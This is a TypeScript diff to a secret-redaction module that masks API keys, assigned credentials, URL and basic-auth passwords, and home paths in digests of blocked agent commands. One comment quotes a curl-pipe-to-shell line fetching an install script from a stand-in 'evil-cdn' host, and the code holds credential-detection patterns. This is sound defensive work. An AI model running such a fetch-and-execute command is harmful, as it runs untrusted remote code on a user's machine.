@@ -7,7 +7,7 @@
  * value of the digest, and those strings are also the only thing in the report
  * that could carry something a person would mind sending.
  *
- * Two transforms, in this order, and the order matters:
+ * Three transforms, in this order, and the order matters:
  *
  *  1. **Secrets are masked**, against `SECRET_PATTERNS` — the same list the
  *     `sanitize-*` policies block on. One definition of "secret", used for both
@@ -17,7 +17,13 @@
  *     time, so a command ending in a credential reaches this module with the
  *     credential's tail missing and the full pattern no longer matching. See
  *     `maskTruncatedSecret`.
- *  2. **Home paths are shortened**, so `/home/sidd/work/acme/src/db.ts` becomes
+ *  2. **Assigned secrets are masked** — `DATABASE_PASSWORD=hunter2`,
+ *     `https://user:pass@host`, `curl -u user:pass`. These are shapes the
+ *     BLOCKING patterns deliberately do not carry, because a name-based rule
+ *     that denies a tool call would misfire on ordinary work. Redaction only
+ *     removes characters, so it can afford the wider net. See
+ *     `maskAssignedSecrets`.
+ *  3. **Home paths are shortened**, so `/home/sidd/work/acme/src/db.ts` becomes
  *     `~/…/db.ts`. The basename is what makes a finding recognisable; the
  *     directory chain is a map of someone's disk and their employer's project
  *     names.
@@ -80,18 +86,24 @@ const PUBLIC_PATH_ROOTS = ["/dev/", "/proc/", "/sys/"];
  * END of the string — with nothing after it, or too little to have matched — is
  * masked on the assumption it was cut, which costs a few characters of context
  * in the rare case it was not.
+ *
+ * Each prefix is guarded by `(?<!\w)` so it only fires at a token boundary.
+ * Without it `sk-` matched INSIDE ordinary words — `kubectl get pods -n
+ * risk-scoring` redacted to `… -n ri[REDACTED: OpenAI API key]`, which both
+ * invents a credential the digest then reports and destroys the one token that
+ * said which command ran. `task-`, `disk-` and `desk-` did the same.
  */
 const SECRET_PREFIXES: ReadonlyArray<readonly [RegExp, string]> = [
-  [/(?:Authorization:\s*)?Bearer\s+\S*$/i, "bearer token"],
-  [/sk-ant-\S*$/, "Anthropic API key"],
-  [/sk-proj-\S*$/, "OpenAI project API key"],
-  [/sk-\S*$/, "OpenAI API key"],
-  [/ghp_\S*$/, "GitHub personal access token"],
-  [/github_pat_\S*$/, "GitHub fine-grained token"],
-  [/AKIA\S*$/, "AWS access key ID"],
-  [/sk_live_\S*$/, "Stripe live secret key"],
-  [/sk_test_\S*$/, "Stripe test secret key"],
-  [/AIza\S*$/, "Google API key"],
+  [/(?<!\w)(?:Authorization:\s*)?Bearer\s+\S*$/i, "bearer token"],
+  [/(?<!\w)sk-ant-\S*$/, "Anthropic API key"],
+  [/(?<!\w)sk-proj-\S*$/, "OpenAI project API key"],
+  [/(?<!\w)sk-\S*$/, "OpenAI API key"],
+  [/(?<!\w)ghp_\S*$/, "GitHub personal access token"],
+  [/(?<!\w)github_pat_\S*$/, "GitHub fine-grained token"],
+  [/(?<!\w)AKIA\S*$/, "AWS access key ID"],
+  [/(?<!\w)sk_live_\S*$/, "Stripe live secret key"],
+  [/(?<!\w)sk_test_\S*$/, "Stripe test secret key"],
+  [/(?<!\w)AIza\S*$/, "Google API key"],
   [/-----BEGIN\s[A-Z ]*$/, "private key"],
 ];
 
@@ -110,6 +122,89 @@ export function maskTruncatedSecret(input: string): string {
     }
   }
   return input;
+}
+
+/**
+ * Identifier fragments that make an assignment's VALUE a secret.
+ *
+ * Two lists, because the words differ in how much they mean on their own.
+ * `TOKEN`, `SECRET` and `PASSWORD` name a credential wherever they appear in an
+ * identifier, including the camelCase `_authToken` that `npm config set`
+ * writes. `KEY`, `PASS`, `AUTH`, `PAT` and `SIG` are also fragments of ordinary
+ * words — `MONKEY_COUNT`, `PASSENGERS`, `AUTHOR`, `PATH`, `SIGNAL` — so they
+ * only count as a whole `_`-delimited component.
+ */
+const SECRET_NAME_SUBSTRINGS = [
+  "TOKEN",
+  "SECRET",
+  "PASSWORD",
+  "PASSWD",
+  "CREDENTIAL",
+  "APIKEY",
+  "PRIVATEKEY",
+];
+const SECRET_NAME_COMPONENTS = ["KEY", "PASS", "AUTH", "PAT", "SIG", "SIGNATURE", "SESSION", "COOKIE"];
+
+/**
+ * `NAME=value`, with the value quoted or running to the next shell separator.
+ *
+ * The unquoted alternative excludes quotes as well as separators: a value that
+ * runs to end-of-token inside an already-quoted string (`"…?sig=deadbeef"`)
+ * would otherwise swallow the closing quote and leave the line unbalanced.
+ */
+const ASSIGNMENT_RE = /\b([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|[^\s;|&"']+)/g;
+
+/** Credentials inline in a URL, on ANY scheme — `https://user:pass@host`. */
+const URL_CREDENTIALS_RE = /([a-z][a-z0-9+.\-]*:\/\/)[^\s/:@]+:[^\s/@]+@/gi;
+
+/** `curl -u user:pass`, in both spellings and both separators. */
+const BASIC_AUTH_FLAG_RE = /((?:^|\s)(?:-u|--user)[\s=])\S+:\S+/g;
+
+/** True when an identifier's name says its value is a credential. */
+export function isSecretName(name: string): boolean {
+  const upper = name.toUpperCase();
+  if (SECRET_NAME_SUBSTRINGS.some((word) => upper.includes(word))) return true;
+  return upper.split("_").some((part) => SECRET_NAME_COMPONENTS.includes(part));
+}
+
+/**
+ * Mask secrets whose shape is an ASSIGNMENT rather than a known vendor prefix.
+ *
+ * This is the one class the blocking patterns deliberately do not cover, and
+ * the gap mattered because `protect-env-vars` is in the digest's harmful set
+ * (`harm-report.ts`) and its dominant trigger is `export VAR=…` — so the
+ * example is the whole command, value included. `SECRET_PATTERNS` matches nine
+ * vendor-prefixed key formats, a JWT, a literal `Authorization: Bearer` and a
+ * fixed non-HTTP scheme list; none of them matches
+ * `export DATABASE_PASSWORD=hunter2-prod-acme`, and `export` is ubiquitous in
+ * agent sessions. Every one of those shipped verbatim.
+ *
+ * These patterns live HERE rather than in `SECRET_PATTERNS` on purpose, and it
+ * is not the "second list that eventually disagrees" this module warns about.
+ * The two jobs have opposite error costs: the `sanitize-*` policies BLOCK a
+ * tool call, so a false positive there is a denial of work the user wanted, and
+ * a name-based rule would deny `export EDITOR=vim` on a machine with
+ * `PASSTHROUGH` in the environment. Redaction only removes characters from a
+ * digest, so it can afford to be generous, and being generous is the point. The
+ * shared list stays the floor; this is the redactor spending its extra margin.
+ *
+ * The NAME is kept and only the value is masked — `DATABASE_PASSWORD=[REDACTED:
+ * assigned secret]` still tells the reader which credential was exposed, which
+ * is the actionable half of the finding.
+ */
+export function maskAssignedSecrets(input: string): string {
+  let out = input.replace(ASSIGNMENT_RE, (match, name: string, value: string) => {
+    if (!isSecretName(name)) return match;
+    // An earlier pass already named this one, and it named it better.
+    // `export ANTHROPIC_API_KEY=sk-ant-…` is masked by the vendor pattern as
+    // "Anthropic API key"; re-masking it here would downgrade that to the
+    // generic label and strip the marker's own tail as it went.
+    if (value.startsWith("[REDACTED")) return match;
+    return `${name}=[REDACTED: assigned secret]`;
+  });
+  out = out.replace(URL_CREDENTIALS_RE, "$1[REDACTED: URL credentials]@");
+  out = out.replace(BASIC_AUTH_FLAG_RE, "$1[REDACTED: basic auth]");
+  return out;
 }
 
 /**
@@ -144,9 +239,25 @@ export function shortenPaths(input: string, home = homedir()): string {
   // with `/home/u/`), which silently turned off home detection for the one path
   // that most needed it.
   const homeRoot = home.replace(/\/+$/, "");
-  return input.replace(ABSOLUTE_PATH_RE, (match) => {
+  return input.replace(ABSOLUTE_PATH_RE, (match, offset: number, whole: string) => {
     // Kernel/device paths are the same on every machine and identify nobody.
     if (PUBLIC_PATH_ROOTS.some((root) => match.startsWith(root))) return match;
+
+    // A URL's HOST is not a directory, and it was being deleted as one.
+    //
+    // `curl https://evil-cdn.example.com/install.sh | sh` came out as
+    // `curl https:/…/install.sh` — the domain is the entire security decision
+    // in a `block-curl-pipe-sh` finding, and it was the one token removed. The
+    // match begins at the second slash of `://`, so the scheme is checked
+    // behind it and the host kept while the path is still shortened.
+    if (offset > 0 && whole[offset - 1] === "/" && /[a-z][a-z0-9+.\-]*:$/i.test(whole.slice(0, offset - 1))) {
+      const urlSegments = match.split("/").filter(Boolean);
+      if (urlSegments.length <= 1) return match;
+      const host = urlSegments[0];
+      const leaf = urlSegments[urlSegments.length - 1];
+      const elided = urlSegments.length > 2 ? "/…" : "";
+      return `/${host}${elided}/${leaf}${match.endsWith("/") ? "/" : ""}`;
+    }
     const trailingSlash = match.endsWith("/");
     const segments = match.split("/").filter(Boolean);
     if (segments.length === 0) return match;
@@ -188,7 +299,11 @@ export function shortenPaths(input: string, home = homedir()): string {
  * saying nothing the single line does not.
  */
 export function redactExample(input: string, home = homedir()): string {
-  const masked = maskTruncatedSecret(maskSecrets(input));
+  // Assignment masking runs LAST of the three, so the two pattern-based passes
+  // get first refusal on anything they can name precisely. A vendor prefix
+  // yields "[REDACTED: Anthropic API key]"; falling through to this one would
+  // have said only "assigned secret", which is true but less useful to read.
+  const masked = maskAssignedSecrets(maskTruncatedSecret(maskSecrets(input)));
   const shortened = shortenPaths(masked, home);
   const collapsed = shortened.replace(/\s+/g, " ").trim();
   return collapsed.length > REDACTED_EXAMPLE_MAX_CHARS
